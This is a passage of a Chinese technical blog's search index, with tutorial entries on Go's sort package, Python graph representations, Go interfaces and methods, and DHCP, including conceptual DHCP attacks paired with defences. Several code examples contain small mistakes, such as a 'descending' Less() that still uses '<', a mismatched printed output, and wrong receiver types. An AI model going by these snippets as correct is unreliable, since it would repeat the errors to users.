addison-Wesley, 2011. [2] 图解ARP协议（一） [3] 图解ARP协议（二）ARP攻击篇]]></content>
      <categories>
        <category>Network</category>
        <category>Network protocol</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>DHCP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang标准库：sort排序]]></title>
    <url>%2F2018%2F09%2F13%2FGolang%E6%A0%87%E5%87%86%E5%BA%93%EF%BC%9Asort%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[Golang 标准库 sort 排序学习。 sort包中实现了３种基本的排序算法：插入排序．快排和堆排序，但是这三种方式都只在sort包内部使用，所以用户在使用sort包进行排序时无需考虑使用那种排序方式，sort包会根据实际数据自动选择高效的排序算法。 基本方法 排序(接口)的三个要素： 待排序元素个数 n ； 第 i 和第 j 个元素的比较函数 cmp ； 第 i 和 第 j 个元素的交换 swap ； sort 包中有一个 sort.Interface 接口，该接口有三个方法 Len() 、 Less(i,j int)和 Swap(i,j int) ，如下： 12345678type Interface interface &#123; // Len方法返回集合中的元素个数 Len() int // Less方法报告索引i的元素是否比索引j的元素小 Less(i, j int) bool // Swap方法交换索引i和j的两个元素 Swap(i, j int)&#125; 任何实现了 sort.Interface 的类型（一般为集合），均可调用该包的 Sort() 方法进行排序。这些方法要求集合内列出元素的索引为整数。通用排序函数 sort.Sort 可以排序任何实现了 sort.Inferface 接口的对象(变量)。方法定义如下： 12345func Sort(data Interface) # 排序data，不保证稳定性func Stable(data Interface) # 排序data，保证稳定性func Reverse(data Interface) Interface # Reverse包装一个Interface接口并返回一个新的Interface接口，对该接口排序可生成递减序列func IsSorted(data Interface) bool # 报告data是否已经被排序func Search(n int, f func(int) bool) int # 采用二分法搜索找到[0, n)区间内最小的满足f(i)==true的值i 基本类型排序 sort 包原生支持 []int 、 []float64 和 []string 三种内建数据类型切片的排序操作，不仅提供了一些特殊的方法，还针对每种类型实现了相应的 sort.Interface 接口，即不必我们自己实现相关的 Len()、Less() 和 Swap() 方法。 整型切片排序 sort 包提供了针对整型切片的如下方法： 123func Ints(a []int) # 将 a 排序为递增顺序func IntsAreSorted(a []int) bool # 判断 a 是否已排序为递增顺序。func SearchInts(a []int, x int) int # 在递增顺序的 a 中搜索 x，返回 x 的索引。如果查找不到，返回值是 x 应该插入 a 的位置（以保证 a 的递增顺序），返回值可以是len(a)。 排序示例： 123456s := []int&#123;5, 2, 6, 3, 1, 4&#125;fmt.Println("是否已排序：", sort.IntsAreSorted(s))sort.Ints(s)fmt.Println("元素 3 的升序排序后索引为：", sort.SearchInts(s, 3))fmt.Println("是否已排序：", sort.IntsAreSorted(s))fmt.Println(s) 输出结果： 1234是否已排序： false元素 1 的升序排序后索引为： 2是否已排序： true[1 2 3 4 5 6] 除了使用特殊指定的函数外，还可以使用改装过的类型 IntSclice 类型， 然后直接调用它们对应的Sort()方法，因为这种类型也实现了 sort.Interface 接口： 123456type IntSlice []int - func (p IntSlice) Len() int - func (p IntSlice) Less(i, j int) bool - func (p IntSlice) Search(x int) int - func (p IntSlice) Sort() - func (p IntSlice) Swap(i, j int) 排序示例： 123s := sort.IntSlice&#123;5, 2, 6, 3, 1, 4&#125;s.Sort()fmt.Println(s) 输出结果： 1[1 2 3 4 5 6] 浮点型切片排序 与整型切片排序相同，sort 包提供了针对浮点型切片的如下方法： 123func Float64s(a []float64)func Float64sAreSorted(a []float64) boolfunc SearchFloat64s(a []float64, x float64) int 同样，也可以使用实现了 sort.Interface 接口的 Float64Slice 类型，并实现了其中的方法： 123456type Float64Slice []float64 - func (p Float64Slice) Len() int - func (p Float64Slice) Less(i, j int) bool - func (p Float64Slice) Search(x float64) int - func (p Float64Slice) Sort() - func (p Float64Slice) Swap(i, j int) 字符串切片排序 与整型切片排序相同，sort 包提供了针对字符串切片的如下方法： 123func Strings(a []string)func StringsAreSorted(a []string) boolfunc SearchStrings(a []string, x string) int 同样，也可以使用实现了 sort.Interface 接口的 StringSlice 类型，并实现了其中的方法： 123456type StringSlice []string - func (p Float64Slice) Len() int - func (p Float64Slice) Less(i, j int) bool - func (p Float64Slice) Search(x string) int - func (p Float64Slice) Sort() - func (p Float64Slice) Swap(i, j int) 稳定排序 Sort 排序 data，它调用 1 次 data.Len 确定长度，调用 O(n*log(n)) 次 data.Less 和 data.Swap。Sort() 函数不能保证排序的稳定性（即不保证相等元素的相对次序不变）。 而 Stable() 函数排序 data 则可以保证排序的稳定性，相等元素的相对次序不变。它调用 1 次 data.Len，O(n*log(n)) 次 data.Less和 O(n*log(n)*log(n)) 次 data.Swap。 1func Stable(data Interface) 降序排列 sort 包可以使用 sort.Reverse(slice) 来调换 slice.Interface.Less，也就是比较函数，所以，int 、float64 和 string 的逆序排序函数可以使用 Reverse 方法来实现。排序示例： 123s := sort.IntSlice&#123;5, 2, 6, 3, 1, 4&#125;sort.Sort(sort.Reverse(s))fmt.Println(s) 输出结果： 1[6 5 4 3 2 1] 排序搜索 Search 函数采用二分法搜索找到 [0, n) 区间内最小的满足 f(i)==true 的值 i 。也就是说，Search 函数希望 f 在输入位于区间 [0, n) 的前面某部分（可以为空）时返回假，而在输入位于剩余至结尾的部分（可以为空）时返回真；Search 函数会返回满足 f(i)==true 的最小值 i 。如果没有该值，函数会返回 n。注意，未找到时的返回值不是 -1，这一点和 strings.Index 等函数不同。Search 函数只会用区间[0, n)内的值调用 f。 12345678x := 11s := []int&#123;3, 6, 8, 11, 45&#125; //注意：已经升序排序pos := sort.Search(len(s), func(i int) bool &#123; return s[i] &gt;= x &#125;)if pos &lt; len(s) &amp;&amp; s[pos] == x &#123; fmt.Println(x, "在s中的位置为：", pos)&#125; else &#123; fmt.Println("s不包含元素", x)&#125; 输出结果： 111 在s中的位置为： 3 如上，给定一个递增顺序的切片 s，调用 Search(len(s), func(i int) bool { return S[i] &gt;= x }) 会返回 data 中最小的索引i满足 s[i] &gt;= 11。如果调用者想要知道 11 是否在切片里，它必须另外检查 s[i] == 11。搜索递减顺序的数据时，应使用 &lt;= 运算符代替 &gt;= 运算符。 自定义类型的排序 如上所述，只要自定义类型实现了 sort.Interface 接口及其方法，该类型的排序就可以通过使用 sort.Sort(slice) 实现。如下，学生成绩排序的例子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport ( "fmt" "sort")type StuScore struct &#123; name string score int&#125;type StuScores []StuScore//Len()func (s StuScores) Len() int &#123; return len(s)&#125;//Less():成绩将有高到低排序func (s StuScores) Less(i, j int) bool &#123; return s[i].score &lt; s[j].score&#125;//Swap()func (s StuScores) Swap(i, j int) &#123; s[i], s[j] = s[j], s[i]&#125;func main() &#123; students := StuScores&#123; &#123;"fzy", 95&#125;, &#123;"qwe", 91&#125;, &#123;"rty", 96&#125;, &#123;"asd", 90&#125;&#125; fmt.Println("未排序:") for _, v := range students &#123; fmt.Println(v.name, ":", v.score) &#125; fmt.Println() //StuScores已经实现了sort.Interface接口 sort.Sort(students) fmt.Println("按成绩升序排序后:") for _, v := range students &#123; fmt.Println(v.name, ":", v.score) &#125;&#125; 输出结果： 1234567891011未排序:fzy : 95qwe : 91rty : 96asd : 90按成绩升序排序后:asd : 90qwe : 91fzy : 95rty : 96 上面的示例实现的是升序排序，如果要得到降序排序结果，其实只要修改 Less() 函数： 1234//Less():成绩降序排序,只将小于号修改为大于号func (s StuScores) Less(i, j int) bool &#123; return s[i].score &lt; s[j].score&#125; 当然，也可以使用 Reverse函数 来实现： 12将 sort.Sort(students) 更改为：sort.Sort(sort.Reverse(StuScores(students))) // 按照成绩的降序排序 参考资料： golang sort —— 排序算法 go语言的排序、结构体排序]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python数据结构-图]]></title>
    <url>%2F2018%2F09%2F11%2FPython%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[Python 算法基础之图结构表示方法总结。 图是一种重要的数据结构，它可以代表各种结构和系统，从运输网络到通信网络，从细胞核中的蛋白质相互作用到人类在线交互。 图是由顶点的有穷非空集合和顶点之间边的集合组成，通常表示为：G(V,E)，其中，G表示一个图，V是图G中的顶点的集合，E是图G中边的集合。如下图： 下面将以如图所示的有向图为例进行说明 Python 中图结构的表示方法。 邻接集合 对于图结构的实现来说，最直观的方式之一就是使用邻接列表。基本上就是针对每个节点设置一个邻接列表，可以使用集合、列表或者字典来实现。第一种是针对每个节点设置一个邻居集合。 12345678910111213# 将节点的编号赋值给相应的节点，方便操作a, b, c, d, e, f, g, h = range(8)N = [ &#123;b, c, d, e, f&#125;, # a &#123;c, e&#125;, # b &#123;d&#125;, # c &#123;e&#125;, # d &#123;f&#125;, # e &#123;c, g, h&#125;, # f &#123;f, h&#125;, # g &#123;f, g&#125; # h] # 列表中每个集合是每个节点邻接点集 N(v) 代表 v 的邻接点集。测试： 1234&gt;&gt;&gt; b in N[a] # 节点 b 是否是 a 的邻居节点True&gt;&gt;&gt; len(N[a]) # 节点 a 的出度5 邻接列表 与邻接集合类似，只是针对每个节点设置的是一个包含所有邻居的列表，而不是集合。 1234567891011a, b, c, d, e, f, g, h = range(8)N = [ [b, c, d, e, f], [c, e], [d], [e], [f], [c, g, h], [f, h], [f, g]] 加权邻接字典 使用字典类型来代替集合或列表来表示邻接表。在字典类型中，每个邻居节点都会有一个键和一个额外的值，用于表示与其邻居节点（或出边）之间的关联性，如边的权重。 1234567891011a, b, c, d, e, f, g, h = range(8)N = [ &#123;b: 2, c: 1, d: 3, e: 9, f: 4&#125;, # a &#123;c: 4, e: 3&#125;, # b &#123;d: 8&#125;, # c &#123;e: 7&#125;, # d &#123;f: 5&#125;, # e &#123;c: 2, g: 2, h: 2&#125;, # f &#123;f: 1, h: 6&#125;, # g &#123;f: 9, g: 8&#125; # h] 测试： 123456&gt;&gt;&gt; b in N[a] # b 是否是 a 的邻居节点True&gt;&gt;&gt; len(N[f]) # 度3&gt;&gt;&gt; N[a][b] # 边(a, b)的权重2 邻接集字典 以上图的表示方法都使用了list类型，其实，也可以使用嵌套的字典结构来实现。 12345678910N = &#123;'a':set('bcdef'), 'b':set('ce'), 'c':set('d'), 'd':set('e'), 'e':set('f'), 'f':set('cgh'), 'g':set('fh'), 'h':set('fg')&#125;# 如果省略set()构造器，用邻接字符串表示键值，工作方式相当于邻接列表 当然，字典的值也可以使用列表来表示。测试： 1234&gt;&gt;&gt;'h' in N['a'] # a 是否有到 h 的边False&gt;&gt;&gt;len(N['g']) # 节点 g 的度2 嵌套字典 也可以使用嵌套字典的方式来实现加权图。 123456789N = &#123;'a':&#123;'b':2, 'c':1, 'd':3, 'e':9, 'f':4&#125;, 'b':&#123;'c':4, 'e':3&#125;, 'c':&#123;'d':8&#125;, 'd':&#123;'e':7&#125;, 'e':&#123;'f':5&#125;, 'f':&#123;'c':2, 'g':2, 'h':2&#125;, 'g':&#123;'f':1, 'h':6&#125;, 'h':&#123;'f':9, 'g':8&#125;&#125; 测试： 123456&gt;&gt;&gt;'f' in N['e'] # e 是否有到 f 的边True&gt;&gt;&gt;len(N['e']) # 节点 e 的度1&gt;&gt;&gt;N['a']['e'] # 边(a, e)的权重9 邻接矩阵 图的另一种常见表示法就是邻接矩阵。这种表示的主要不同之处在于，它不再列出每个节点的所有邻居节点，而是会将每个节点可能的邻居位置排成一行（也就是一个数组，用于对应图中每一个节点），然后用某种值（如True或False）来表示相关节点是否为当前节点的邻居。 1234567891011a, b, c, d, e, f, g, h = range(8)N =[ [0, 1, 1, 1, 1, 1, 0, 0], [0, 0, 1, 0, 1, 0, 0, 0], [0, 0, 0, 1, 0, 0, 0, 0], [0, 0, 0, 0, 1, 0, 0, 0], [0, 0, 0, 0, 0, 1, 0, 0], [0, 0, 1, 0, 0, 0, 1, 1], [0, 0, 0, 0, 0, 1, 0, 1], [0, 0, 0, 0, 0, 1, 1, 0],] 测试： 1234&gt;&gt;&gt; N[a][b] # a 是否有到 f 的边1&gt;&gt;&gt; sum(N[f]) # 节点 f 的度，不能再用 len 函数3 注意，邻接矩阵中： 主对角线为自己到自己，为 0 行和为出度 列和为入度 加权邻接矩阵 对不存在的边赋予无限大权值的加权矩阵。 123456789101112a, b, c, d, e, f, g, h = range(8)inf = float("inf") # 无穷大W = [ [ 0, 2, 1, 3, 9, 4, inf, inf], # a [inf, 0, 4, inf, 3, inf, inf, inf], # b [inf, inf, 0, 8, inf, inf, inf, inf], # c [inf, inf, inf, 0, 7, inf, inf, inf], # d [inf, inf, inf, inf, 0, 5, inf, inf], # e [inf, inf, 2, inf, inf, 0, 2, 2], # f [inf, inf, inf, inf, inf, 1, 0, 6], # g [inf, inf, inf, inf, inf, 9, 8, 0] # h] 测试： 123456&gt;&gt;&gt; W[a][b] &lt; inf # a 是否有到 b 的边True&gt;&gt;&gt; W[c][e] &lt; inf # c 是否有到 e 的边False&gt;&gt;&gt; sum(1 for w in W[a] if w &lt; inf) - 1 # 度5 参考资料： Hetland M L. Python Algorithms: mastering basic algorithms in the Python Language[M]. Apress, 2014.]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DHCP：动态主机配置协议]]></title>
    <url>%2F2018%2F09%2F10%2FDHCP%EF%BC%9A%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[DHCP 协议学习总结。 基本原理 DHCP (Dynamic Host Configuration Protocol，动态主机配置协议) 提供了即插即用的连网方式，用户不再需要去手动配置 IP 地址等信息。DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、网关 IP 地址。 DHCP是一个局域网的网络协议，使用UDP协议工作，常用的2个端口：67(DHCP server)，68(DHCP client)，其工作过程如下： 客户端发送 Discover 报文，该报文的目的地址为 255.255.255.255:67，源地址为 0.0.0.0:68，被放入 UDP 中，该报文被广播到同一个子网的所有主机上。如果客户端和 DHCP 服务器不在同一个子网，就需要使用中继代理。 DHCP 服务器收到 Discover 报文之后，发送 Offer 报文给客户端，该报文包含了客户端所需要的信息。因为客户端可能收到多个 DHCP 服务器提供的信息，因此客户端需要进行选择。 如果客户端选择了某个 DHCP 服务器提供的信息，那么就发送 Request 报文给该 DHCP 服务器。 DHCP 服务器发送 Ack 报文，表示客户端此时可以使用提供给它的信息。 DHCP 客户端 DHCP 客户端一般来说是局域网中独立的PC主机，租约、续约、发现、释放IP地址等大多数 DHCP 中的行为都是由 DHCP 客户端主动发起。 重新登录 DHCP 客户端每次重新登录网络时，就不需要再发送 DHCP discover 发现信息，而是直接发送包含前一次所分配的IP地址的 DHCP request 请求信息。然后， 如果客户端 DHCP request 内的IP地址在服务器端没有被使用，DHCP服务器回复 DHCP ACK继续使用IP。 如果客户端 DHCP request 内的IP地址在服务器端已被使用，DHCP服务器回复 DHCP NACK告诉客户端IP已被使用。 客户端重新开始DHCP流程。 租约与续约 租约就是 DHCP 分配给客户端的IP地址的使用期限，期满后 DHCP 服务器便会收回出租的 IP 地址，然后需要重新分配。如果 DHCP 客户机要延长其IP租约，则必须更新其IP租约。如果租约设置过长，就会出现 IP 地址已经分配完的假象。 在指定的时间间隔内，DHCP 客户端尝试续订租约以保证它能够得到最新的配置信息： 自动租约续订 DHCP 客户机启动时和IP租约期限到达租约的50%时，DHCP 客户机都会自动向 DHCP 服务器发送更新其IP租约的信息。 如果 DHCP 服务器是可用的，它将续订租约并向客户端发送一条 DHCPACK 消息，此消息包含新的租约期限和一些更新的配置参数。客户端收到确认后就会更新配置。 如果 DHCP 服务器不可用，则客户端将继续使用当前的配置参数。 当租约时间间隔的87.5%到期时，客呼端会广播一条 DHCP DISCOVER 消息来更新它的地址租约。这个阶段，DHCP 客户端会接受从任何 DHCP 服务器发出的租约。如果 DHCP 服务器以一条 DHCPOFFER 消息响应来更新客户端当前的租约，那么客户端可以基于提供消息的服务器续订租约并继续运行。 如果租约到期了，那么客户端必须立即释放当前使用的IP地址。然后，DHCP 客户端重新开始 DHCP 租约过程，尝试租用一个新的 IP 地址。 手动租约续订 如果需要立即更新DHCP配置消息，用户可以手动续订IP租约。例如，如果用户希望 DHCP 客户端立即从DHCP 服务器获取新安装的路由器的地址，那么需要用户从客户端续订租约来更改这些配置。要手动续订租约，使用 ipconfig 命令，并带 /renew 开关参数。这条命令向 DHCP 服务器发送一条 DHCP REQUEST 消息请求更新配置选项和续订租约时间。 DHCP 服务器基本功能 DHCP SERVER 指的是服务器端，在路由器上体现的就是给LAN端动态分配IP的功能。DHCP SERVER 负责接收客户端的 DHCP 请求，管理 LAN 端所有的IP网络设定资料。DHCP 通过“租约”来实现动态分配IP的功能，实现 IP 的时分复用，从而解决 IP 资源短缺的问题。 DHCP服务器提供三种IP分配方式： 自动分配 ：自动分配是当 DHCP 客户端第一次成功地从 DHCP 服务器端分配到一个IP地址之后，就永远使用这个地址。 动态分配（最常用）： 动态分配是当 DHCP 客户端第一次从 DHCP 服务器分配到IP地址后，并非永久地使用该地址，每次使用完后，DHCP 客户端就得释放这个 IP 地址，以给其他客户端使用。 手动分配：手动分配是由 DHCP 服务器管理员专门为客户端指定IP地址。 两个租约表： 静态租约表：对应一个静态租约存储文件，SERVER 运行时从文件中读取静态租约表。 动态租约表：对应一个周期存储文件，SERVER 周期性将租约表存进该文件，在程序开始时将会读取上次存放的租约表。（租约表记录了当前所有分配的租约，包括静态链接的）。 基本逻辑 原则上 DHCP SERVER 是一直处在被动接受请求的状态。当有客户端请求时，服务器会读取获得客户端当前所在的状态以及客户端的信息，并在静态租约表和动态租约表中进行检索找到相应的表项，再根据客户端的状态执行不同的回复。当收到客户端的首次请求时，DHCP 服务器先查找静态租约表；若存在请求的表项，返回这个客户的静态 IP 地址；否则，从 IP 地址池中选择可用的 IP 分配给客户，并添加信息到动态数据库中。此外，服务器将会周期性的刷新租约表写入文件存档，在这个过程中会顺便对动态租约表进行租期检查。 DHCP 服务器收到相应请求后会执行回复动作： DHCPOFFER： 静态租用：首先匹配MAC地址，看是否能在静态租约表中找到对应的项，若能找到就把IP分配给他。静态表中的IP不能被其他客户使用。 动态租用： server试图分配给client上次分配过的IP，在这之前检查这个IP是否正在使用。 discover中含有request ip 时，检查该IP是否在地址池范围，是否正在使用，是否到期，是否是静态IP，网络上是否已经存在。 discover不含request ip，从地址池上寻找一个最小的可用IP分配。 DHCPACK： 根据是否含有request ip和server ip识别客户端现在init_reboot,selecting,renewing/rebinding中的哪个状态，并根据以下规则执行DHCPACK回复： 若client处于selecting状态，验证request ip和server ip是否同服务器中的匹配。 若client处于init_reboot状态，验证request ip是否符合租约记录。 若client处于renewing/rebinding状态，验证client ip address是否符合租约记录。 …… DHCP 攻击DHCP 洪泛攻击 在 DHCP 网络环境中，若存在 DHCP 用户短时间内向设备发送大量的 DHCP 报文，将会对设备的性能造成巨大的冲击以致可能会导致设备无法正常工作。通过使能对 DHCP 报文上送 DHCP 报文处理单元的速率进行检测功能将能够有效防止 DHCP 报文泛洪攻击。 防范：配置限制 DHCP 报文的上送速率。 DHCP 耗尽攻击 用虚假的MAC地址广播伪造的 DHCP 请求，如果发送了大量的请求，攻击者可以在一定时间内耗尽 DHCP Servers 可提供的地址空间。 防范：可以通过交换机的 Port-Security（端口安全性）功能来防范耗尽攻击。 DHCP 假冒攻击 耗尽 DHCP 服务端的地址资源之后，攻击者可以仿冒一个 DHCP 服务器来响应网络上其他客户的 DHCP 请求，从而实现 DHCP 假冒攻击。攻击者伪造 DHCP 服务器给计算机分配 IP，并指定一个虚假的 DNS 服务器地址，当用户访问网站的时候，就被虚假DNS服务器引导到错误的网站。 防范：通过传统的 DHCP Snooping 技术就可以来防范 DHCP 假冒攻击。当启用 DHCP Snooping 功能之后，交换机的所有端口都将无法接收 DHCP Offer 报文，假冒的 DHCP 服务器就无法向外分配IP地址了。DHCP Snooping 可以防止假冒攻击，但是无法防止耗尽攻击，因为尽攻击所采用的都是客户端正常发送的 DHCP Discover 报文。]]></content>
      <categories>
        <category>Network</category>
        <category>Network protocol</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>DHCP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-接口]]></title>
    <url>%2F2018%2F09%2F02%2FGolang%E7%AC%94%E8%AE%B0-%E6%8E%A5%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[Golang 接口学习。 定义与使用 Go 语言中没有类和继承的概念，但是它里有非常灵活的 接口 概念，通过它可以实现很多面向对象的特性。接口提供了一种方式来 说明 对象的行为：如果谁能搞定这件事，它就可以用在这儿。接口定义了一组方法（方法集），但是这些方法不包含实现代码。并且，接口里也不能包含变量。 12345type Namer interface &#123; Method1(param_list) return_type Method2(param_list) return_type ...&#125; 一般情况下，接口的名字由方法名加 [e]r 后缀组成，例如 Printer、Reader、Writer 等等。当后缀 er 不合适时，接口名也可以以 able 结尾，或者以 I 开头。Go 语言中的接口都很简短，通常它们会包含 0 个、最多 3 个方法。 类型（比如结构体）实现接口方法集中的方法，每一个方法的实现说明了此方法是如何作用于该类型的：即实现接口，同时方法集也构成了该类型的接口。实现了 Namer 接口类型的变量可以赋值给接收者值，此时方法表中的指针会指向被实现的接口方法。当然，如果另一个类型（也实现了该接口）的变量被赋值给接收者值，这二者也会随之改变。 接口具有很大的灵活性的原因： 类型不需要显式声明它实现了某个接口：接口被隐式地实现。 多个类型可以实现同一个接口，一个类型也可以实现多个接口。 实现某个接口的类型，除了实现接口方法外，也可以有其他的方法。 接口类型可以包含一个实例的引用， 该实例的类型实现了此接口（接口是动态类型）。 即使接口在类型之后才定义，二者处于不同的包中，被单独编译：只要类型实现了接口中的方法，它就实现了此接口。 12345678910111213141516type School struct &#123; // 结构体 name string&#125;type Valuer interface &#123; // 接口 getName() string&#125;func (s *School) getName() string &#123; return s.name&#125;func main() &#123; var v Valuer = &amp;School&#123;"CSU"&#125; // 结构体变量赋值给接口变量 fmt.Println(v.getName()) // 调用方法&#125; 输出结果： 1CSU 如上，定义了一个结构体 School 和 一个接口 Value ，接口有两个方法 getName() 和 getId()，在 main() 函数中创建了一个 School 实例并赋值给了接口类型的变量，现在接口变量包含一个指向 School 变量的引用，通过它可以调用 School 上的方法 getName() 和 getId()。 在接口上调用方法时，必须有和方法定义时相同的接收者类型或者是可以从具体类型 P 直接可以辨识的： 指针方法可以通过指针调用 值方法可以通过值调用 接收者是值的方法可以通过指针调用，因为指针会首先被解引用 接收者是指针的方法不可以通过值调用，因为存储在接口中的值没有地址 将一个值赋值给一个接口时，编译器会确保所有可能的接口方法都可以在此值上被调用，因此不正确的赋值在编译期就会失败。 多态：根据当前的类型选择正确的方法，或者说：同一种类型在不同的实例上似乎表现出不同的行为。 12345678910111213141516171819202122232425262728type School struct &#123; // 结构体 name string&#125;type Student struct &#123; // 结构体 name string&#125;type Valuer interface &#123; // 接口 getName() string&#125;func (s *School) getName() string &#123; // 接收者为指针类型 return s.name&#125;func (s Student) getName() string &#123; // 接收者为值类型 return s.name&#125;func main() &#123; sc := &amp;School&#123;"CSU"&#125; // 指针类型 st := Student&#123;"fzy"&#125; // 值类型 v := []Valuer&#123;sc, st&#125; for _, vi := range v &#123; fmt.Println(vi.getName()) &#125;&#125; 如上，在调用 vi.getName() 时，只知道 vi 是一个 Valuer 接口， 实际却是 School 和 Student 变量，并且可以调用他们所实现的方法。 类型断言使用 if-type12345if v, ok := vi.(T); ok &#123; // 例如检查上面例子中的接口vi是否是类型T Process(v) return&#125;// vi 不是类型 T 如果转换合法，v 是 vi 转换到类型 T 的值，ok 会是 true；否则 v 是类型 T 的零值，ok 是 false，也没有运行时错误发生。 使用 type-switch 接口变量的类型也可以使用一种特殊形式的 switch 来检测：type-switch 12345678910switch t := vi.(type) &#123;case *School: fmt.Printf("Type School %T with value %v\n", t, t)case *Student: fmt.Printf("Type Student %T with value %v\n", t, t)case nil: fmt.Printf("nil value: nothing to check?\n")default: fmt.Printf("Unexpected type %T\n", t)&#125; 其中，变量 t 得到了 vi 的类型，然后通过 switch 匹配进行相应的处理。也可以用 type-switch 进行运行时类型分析，但是在 type-switch 不允许有 fallthrough 。 测试一个值是否实现了某个接口 假定 v 是一个值，然后我们想测试它是否实现了上面的 Valuer 接口，可以这样做： 123456789type Valuer interface &#123; getName() string getId() int&#125;if _, ok := v.(Valuer); ok &#123; // v 实现了 Valuer 接口 fmt.Println(v.getName(), v.getId())&#125; 接口是一种契约，实现类型必须满足它，它描述了类型的行为，规定类型可以做什么。接口彻底将类型能做什么，以及如何做分离开来，使得相同接口的变量在不同的时刻表现出不同的行为，这就是多态的本质。 空接口 空接口或者最小接口 不包含任何方法，它对实现不做任何要求： 1type Any interface &#123;&#125; 任何其他类型都实现了空接口（它不仅仅像 Java/C# 中 Object 引用类型），any 或 Any 是空接口一个很好的别名或缩写。 空接口类似 Java/C# 中所有类的基类： Object 类，二者的目标也很相近。可以给一个空接口类型的变量赋任何类型的值。 构建通用类型或包含不同类型变量的数组： 1234567891011121314151617181920type Element interface&#123;&#125;type Vector struct &#123; a [10]Element&#125;func (p *Vector) At(i int) Element &#123; return p.a[i]&#125;func (p *Vector) Set(i int, e Element) &#123; p.a[i] = e&#125;func main() &#123; v := new(Vector) v.Set(0, "fzy") v.Set(1, 111) fmt.Println(v.At(0), v.At(1))&#125; 输出结果： 1fzy 111]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-方法]]></title>
    <url>%2F2018%2F09%2F02%2FGolang%E7%AC%94%E8%AE%B0-%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Golang 方法学习 上一篇博客，我们介绍了 Go 语言中的结构体，它就像是类的一种简化形式。这篇博客要介绍的是 Go 语言中的方法，类似于面向对象语言中类的。Go 方法是作用在接收者（receiver）上的一个函数，接收者是某种类型的变量。因此方法是一种特殊类型的函数。 一个类型加上它的方法等价于面向对象中的一个类。一个重要的区别是：在 Go 语言中，类型的代码和绑定在它上面的方法的代码可以不放置在一起，它们可以存在在不同的源文件，唯一的要求是：它们必须是同一个包的。 方法定义 方法的定义与普通函数的定义类似，只是在函数名字前面多了个参数，这个参数就是接收者，它将方法绑定到接收者对应的类型。定义方法的一般格式如下： 1func (recv receiver_type) methodName(parameter_list) (return_value_list) &#123; ... &#125; receiver_type 叫做 （接收者）基本类型，这个类型必须在和方法同样的包中被声明。在方法名之前，func 关键字之后的括号中指定接收者。示例： 12345678type Student struct &#123; name string number int&#125;func (s *Student) Name() &#123; // 方法 fmt.Println(s.name)&#125; 接收者类型可以是（几乎）任何类型， 但是接收者不能是一个接口类型，因为接口是一个抽象定义，但是方法却是具体实现。 接收者也不能是一个指针类型，但是它可以是任何其他允许类型的指针。 类型 T（或 T）上的所有方法的集合叫做类型 T（或 T）的方法集。因为方法是函数，所以同样的，不允许方法重载，即对于一个类型只能有一个给定名称的方法。但是如果基于接收者类型，是有重载的：具有同样名字的方法可以在 2 个或多个不同的接收者类型上存在： 1234567func (s *Student) Name() &#123; // 接收者为Student fmt.Println(s.name)&#125;func (s *School) Name() &#123; // 接收者为School fmt.Println(s.name)&#125; 方法调用 如果 recv 是 receiver 的实例，Method 是它的方法名，那么方法调用遵循传统的 object.name 选择器符号： 1recv.Method() 如果 recv 是一个指针，Go 会自动解引用。 1234567891011121314151617type Student struct &#123; name string number int&#125;func (s *Student) Name() &#123; // 方法 fmt.Println(s.name)&#125;func main() &#123; s1 := Student&#123;"fzy", 11&#125; // 值 s2 := new(Student) // 指针 s2.name = "fzy" // 赋值 s2.number = 11 s1.Name() // 方法调用 s2.Name() // 方法调用&#125; 输出结果： 12fzyfzy 指针或值作为接收者 鉴于性能的原因，recv 最常见的是一个指向 receiver_type 的指针（因为我们不想要一个实例的拷贝，如果按值调用的话就会是这样），特别是在 receiver 类型是结构体时，就更是如此了。指针方法和值方法都可以在指针或非指针上被调用： 1234567891011121314151617181920212223type Student struct &#123; name string number int&#125;func (s *Student) Name() &#123; // 指针方法 fmt.Println(s.name)&#125;func (s Student) Number() &#123; // 值方法 fmt.Println(s.number)&#125;func main() &#123; s1 := Student&#123;"fzy", 11&#125; // 值 s2 := new(Student) // 指针 s2.name = "fzy" s2.number = 11 s1.Name() // 值类型调用指针方法 s1.Number() // 值类型调用值方法 s2.Name() // 指针类型调用指针方法 s2.Number() // 指针类型调用值方法&#125; 函数与方法的区别 函数将变量作为参数：Function(recv) 方法在变量上被调用：recv.Method() 在接收者是指针时，方法可以改变接收者的值（或状态），当参数作为指针传递，即通过引用调用时，函数也可以改变参数的状态。 接收者必须有一个显式的名字，这个名字必须在方法中被使用。而函数的参数则可以没有显式的名字，并且不一定要在函数中使用。 Get 和 Set 方法 可以通过面向对象语言一个众所周知的技术：提供 getter 和 setter 方法，来实现对未导出字段的访问。在 Go 语言中，对于 setter 方法使用 Set 前缀，对于 getter 方法只使用成员名。 例如，在下面的程序中，person 包中定义了 Person 结构体，由于首字母大写，是可以被外部包调用的，但是其中的字段都是小写字母开头，所以并不能被访问。此时，就需要提供 getter 和 setter 方法： person/person.go： 12345678910111213141516171819202122package persontype Person struct &#123; // 外部可见 name string // 外部不可见 age int // 外部不可见&#125;func (p *Person) Name() string &#123; // getter return p.name&#125;func (p *Person) SetName(newName string) &#123; // setter p.name = newName&#125;func (p *Person) Age() int &#123; // getter return p.age&#125;func (p *Person) SetAge(newAge int) &#123; // setter p.age = newAge&#125; main.go： 12345678910111213package mainimport 